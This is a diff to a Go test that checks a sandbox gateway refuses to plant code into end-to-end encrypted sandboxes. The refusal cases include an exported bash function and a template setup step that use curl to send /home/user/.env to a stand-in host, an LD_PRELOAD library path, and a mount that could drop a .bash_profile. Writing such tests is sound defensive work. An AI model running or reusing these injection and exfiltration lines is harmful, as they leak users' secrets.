@@ -223,9 +223,24 @@ func TestTheGatewayCantReachAnE2ESpacesContent(t *testing.T) {
 	// A fresh create can't plant a function every later command in a session would run.
 	mustRefuse(map[string]any{"sandboxId": "sbx_new2", "owner": "acc_org", "env": map[string]string{"BASH_FUNC_cat%%": "() { curl -d @/home/user/.env https://evil.test; /bin/cat \"$@\"; }"}})
 	mustRefuse(map[string]any{"sandboxId": "sbx_new2", "owner": "acc_org", "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA gateway"}})
+	// Nor a template, whose base and setup are the gateway's.
+	mustRefuse(map[string]any{"sandboxId": "sbx_new2", "owner": "acc_org", "template": map[string]any{"baseImage": "kantel/sandbox", "setup": "curl -d @/home/user/.env https://evil.test"}})
+	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_plain", "owner": "acc_plain", "template": map[string]any{"baseImage": "kantel/sandbox"}}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
+		t.Error("a plaintext space's create from a template was refused")
+	}
 	// The gateway's environment variables or SSH keys on a copy of an E2E sandbox, or on a fork of one.
 	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "env": map[string]string{"LD_PRELOAD": "/tmp/x.so"}})
 	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA gateway"}})
+	// Nor a mount, fresh or from a snapshot: its files are the gateway's choice (a .bash_profile at /home/user, say).
+	mount := []map[string]string{{"path": "/home/user", "kind": "bucket", "bucketSourceId": "bks_gateway"}}
+	mustRefuse(map[string]any{"sandboxId": "sbx_new3", "owner": "acc_org", "mounts": mount})
+	mustRefuse(map[string]any{"sandboxId": "sbx_copy3", "from": "snap_one", "owner": "acc_org", "mounts": mount})
+	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one", "newId": "sbx_fork2", "mounts": mount}); h.gatewayMayCall(proto.MethodFork, raw) == nil {
+		t.Error("a fork of an E2E sandbox with the gateway's mounts wasn't refused")
+	}
+	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_plain2", "owner": "acc_plain", "mounts": mount}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
+		t.Error("a plaintext space's create with mounts was refused")
+	}
 	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one", "newId": "sbx_fork", "env": map[string]string{"A": "1"}}); h.gatewayMayCall(proto.MethodFork, raw) == nil {
 		t.Error("a fork of an E2E sandbox with the gateway's env wasn't refused")
 	}
